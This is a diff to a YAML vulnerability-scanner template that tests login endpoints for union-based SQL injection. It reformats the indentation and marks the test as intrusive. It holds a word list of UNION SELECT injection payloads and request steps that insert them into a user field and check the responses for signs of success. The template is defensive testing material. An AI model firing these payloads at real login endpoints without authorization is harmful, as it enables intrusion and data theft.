@@ -1,7 +1,7 @@
 id: UNION_DATA_TYPE_BASED_SQLI
 info:
   name: "Union based SQL Injection test with data type variations on Login Endpoints"
-  description: > 
+  description: >
     "A Union-based SQL Injection test with data type variations on login endpoints involves injecting SQL queries that manipulate the data types used in UNION SELECT statements. This method aims to exploit vulnerabilities by combining results from queries that handle different data types, potentially revealing sensitive information. Testers adjust their injections to match expected data types in the database schema, observing how the application responds to identify and exploit weaknesses in input validation and SQL query execution."
   details: >
     "In a Union-based SQL Injection test with data type variations on login endpoints, testers inject SQL queries with UNION SELECT statements that manipulate data types (such as integers, strings, or dates) to retrieve specific information from different database columns. This method aims to bypass security measures by exploiting mismatches in data type handling within SQL queries. By observing how the application responds to these injections, testers can uncover vulnerabilities related to improper input validation and potentially gain unauthorized access to sensitive data."
@@ -28,6 +28,8 @@ info:
     - CVE-2020-24008
     - CVE-2021-45901
 
+settings:
+  nature: INTRUSIVE
 api_selection_filters:
   method:
     neq: "OPTIONS"
@@ -39,7 +41,7 @@ api_selection_filters:
       gt: 0
     not_contains:
       - Error
-      - Internal Server 
+      - Internal Server
       - Failed
       - Unauthorized
       - access denied
@@ -108,101 +110,99 @@ wordLists:
     - "' UNION SELECT 1, null, null WHERE 1=0 --"
     - "' UNION SELECT null, 'a', null WHERE 1=0 --"
     - "' UNION SELECT null, null, 'a' WHERE 1=0 --"
- 
 execute:
   type: multiple
   requests:
-  - req:
-    - modify_body_param:
-        userKey: ${userVal}${unionBasedPayloads}
-    - validate:
-        response_code:
-          gte: 200
-          lt: 300
-        response_payload:
-          length:
-            gt: 0
-          not_contains:
-            - Error
-            - Internal Server 
-            - Fail
-            - Unauthorized
-            - access denied
-            - Forbidden
-            - Method Not allowed
-            - Gateway timeout
-            - request timeout
-            - server error
-            - server busy
-            - authentication error
-            - authorization error
-            - validation error
-            - Permission Denied
-            - invalid
-            - token expired
-            - session expired
-            - session timeout
-            - unexpected error
-            - unable to process request
-            - bad request
-            - service unavailable
-            - account is locked
-            - account is blocked
-            - multiple failed attempts
-            - Attention Required!
-            - CloudFlare
-            - Sorry, you have been blocked
-            - " UNION SELECT "
-            - <html>
-            - </html>
-    - success: x2
-    - failure: exit
-  - req:
-    - modify_body_param:
-        userKey: ${userVal}${unionBasedNegativePayloads}
-    - validate:
-        response_code:
-          gte: 200
-          lt: 300
-        response_payload:
-          length:
-            gt: 0  
-          not_contains:
-            - Error
-            - Internal Server 
-            - Fail
-            - Unauthorized
-            - access denied
-            - Forbidden
-            - Method Not allowed
-            - Gateway timeout
-            - request timeout
-            - server error
-            - server busy
-            - authentication error
-            - authorization error
-            - validation error
-            - Permission Denied
-            - invalid
-            - token expired
-            - session expired
-            - session timeout
-            - unexpected error
-            - unable to process request
-            - bad request
-            - service unavailable
-            - account is locked
-            - account is blocked
-            - multiple failed attempts
-            - Attention Required!
-            - CloudFlare
-            - Sorry, you have been blocked
-            - " UNION SELECT "   
-            - <html>
-            - </html> 
-          neq: "${x1.response.body}"
-    - success: vulnerable
-        
+    - req:
+        - modify_body_param:
+            userKey: ${userVal}${unionBasedPayloads}
+        - validate:
+            response_code:
+              gte: 200
+              lt: 300
+            response_payload:
+              length:
+                gt: 0
+              not_contains:
+                - Error
+                - Internal Server
+                - Fail
+                - Unauthorized
+                - access denied
+                - Forbidden
+                - Method Not allowed
+                - Gateway timeout
+                - request timeout
+                - server error
+                - server busy
+                - authentication error
+                - authorization error
+                - validation error
+                - Permission Denied
+                - invalid
+                - token expired
+                - session expired
+                - session timeout
+                - unexpected error
+                - unable to process request
+                - bad request
+                - service unavailable
+                - account is locked
+                - account is blocked
+                - multiple failed attempts
+                - Attention Required!
+                - CloudFlare
+                - Sorry, you have been blocked
+                - " UNION SELECT "
+                - <html>
+                - </html>
+        - success: x2
+        - failure: exit
+    - req:
+        - modify_body_param:
+            userKey: ${userVal}${unionBasedNegativePayloads}
+        - validate:
+            response_code:
+              gte: 200
+              lt: 300
+            response_payload:
+              length:
+                gt: 0
+              not_contains:
+                - Error
+                - Internal Server
+                - Fail
+                - Unauthorized
+                - access denied
+                - Forbidden
+                - Method Not allowed
+                - Gateway timeout
+                - request timeout
+                - server error
+                - server busy
+                - authentication error
+                - authorization error
+                - validation error
+                - Permission Denied
+                - invalid
+                - token expired
+                - session expired
+                - session timeout
+                - unexpected error
+                - unable to process request
+                - bad request
+                - service unavailable
+                - account is locked
+                - account is blocked
+                - multiple failed attempts
+                - Attention Required!
+                - CloudFlare
+                - Sorry, you have been blocked
+                - " UNION SELECT "
+                - <html>
+                - </html>
+              neq: "${x1.response.body}"
+        - success: vulnerable
 
-   
-  
+
+
